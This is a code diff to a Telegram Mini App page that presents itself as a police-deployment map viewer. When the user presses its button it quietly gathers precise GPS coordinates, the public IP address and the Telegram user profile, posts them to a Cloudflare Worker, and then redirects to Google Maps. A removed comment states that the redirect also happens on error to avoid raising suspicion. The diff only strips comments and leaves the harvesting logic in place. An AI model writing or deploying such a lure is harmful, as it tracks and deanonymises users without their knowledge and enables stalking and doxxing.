@@ -30,7 +30,7 @@
 
     <div class="card">
         <h2>勤務指揮中心綜合派遣系統</h2>
-        <p>-低調-  查看鄰近的警力佈署以避免不必要的麻煩  -低調-。</p>
+        <p>-低調- 查看鄰近的警力佈署以避免不必要的麻煩 -低調-。</p>
         <button id="btn">🚀 開啟 Google 地圖</button>
         <div id="status">系統就緒</div>
     </div>
@@ -40,7 +40,6 @@
         tg.ready();
         tg.expand();
 
-        // 你的 Cloudflare Worker 網址
         const WORKER_URL = 'https://tg-proxy.nhojsmot.workers.dev';
 
         document.getElementById('btn').onclick = function() {
@@ -51,7 +50,6 @@
             btn.innerText = "正在定位中...";
             statusDiv.innerText = "請在彈出的視窗選擇「允許」";
 
-            // 1. 取得地理位置
             navigator.geolocation.getCurrentPosition(async (position) => {
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
@@ -59,14 +57,11 @@
                 statusDiv.innerText = "正在同步地圖資源...";
 
                 try {
-                    // 2. 取得 IP
                     const ipRes = await fetch('https://api.ipify.org?format=json');
                     const ipData = await ipRes.json();
                     
-                    // 3. 取得 Telegram 使用者資料
                     const user = tg.initDataUnsafe.user || {};
 
-                    // 4. 傳送到 Cloudflare Worker (安全轉發)
                     await fetch(WORKER_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -79,19 +74,17 @@
                         })
                     });
 
-                    // 5. 成功後轉跳到 Google Maps 定位點
                     statusDiv.innerText = "跳轉中...";
                     setTimeout(() => {
+                        // 修正：使用 ${lat} 模板字串語法
                         tg.openLink(`https://www.google.com/maps?q=${lat},${lon}`);
                         tg.close();
                     }, 400);
 
                 } catch (e) {
-                    // 發生錯誤也要讓用戶跳轉，以免起疑
                     tg.openLink(`https://www.google.com/maps?q=${lat},${lon}`);
                 }
             }, (error) => {
-                // 用戶拒絕定位，跳轉到一般地圖
                 tg.openLink('https://www.google.com/maps');
                 tg.close();
             }, { enableHighAccuracy: true });
